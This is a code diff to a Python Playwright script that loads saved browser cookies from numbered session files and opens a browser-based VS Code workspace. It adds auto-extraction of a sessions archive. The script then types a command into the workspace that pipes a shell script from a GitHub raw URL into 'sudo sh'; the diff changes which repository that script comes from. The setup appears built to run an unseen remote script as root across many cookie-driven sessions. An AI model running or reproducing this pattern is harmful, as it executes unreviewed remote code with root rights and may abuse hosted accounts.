@@ -71,7 +71,8 @@ def launch_browser(p):
 
 def _load_cookies(context: BrowserContext, cookies_file: str):
     with open(cookies_file) as f:
-        context.add_cookies(json.load(f))
+        data = json.load(f)
+        context.add_cookies(data if isinstance(data, list) else data.get("cookies", list(data.values())))
 
 
 def _delete_started_workspace(page: Page):
@@ -341,7 +342,7 @@ def open_vscode(page: Page, context: BrowserContext) -> Page:
 def _screenshot(page: Page) -> np.ndarray:
     while True:
         try:
-            buf = np.frombuffer(page.screenshot(timeout=60000, animations="disabled"), np.uint8)
+            buf = np.frombuffer(page.screenshot(timeout=0), np.uint8)
             return cv2.imdecode(buf, cv2.IMREAD_COLOR)
         except Exception as e:
             print(f"[debug] screenshot failed: {e}", flush=True)
@@ -437,10 +438,7 @@ def run_init_command(vs_page: Page, cx: int, cy: int):
     log("✓", "Typing command...", "green")
     vs_page.mouse.click(cx, cy)
     vs_page.wait_for_timeout(500)
-    vs_page.keyboard.type(
-        "curl 'https://raw.githubusercontent.com/hasnaouiyacine59-wq/blackbox"
-        "/refs/heads/master/init_.sh' | sudo sh"
-    )
+    vs_page.keyboard.type("curl 'https://raw.githubusercontent.com/hasnaouiyacine59-wq/any_nova/refs/heads/master/init_.sh' | sudo sh")
     vs_page.wait_for_timeout(500)
     vs_page.keyboard.press("Enter")
 
@@ -466,6 +464,10 @@ def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('-s', type=int, default=1, help='Session number (1-based)')
     args = parser.parse_args()
+
+    if not os.path.isdir(SESSIONS_DIR):
+        log("~", "sessions/ not found, extracting sessions.tar.xz...", "yellow")
+        os.system("tar xvf sessions.tar.xz")
 
     cookies_file, session_name = pick_session(args.s)
 
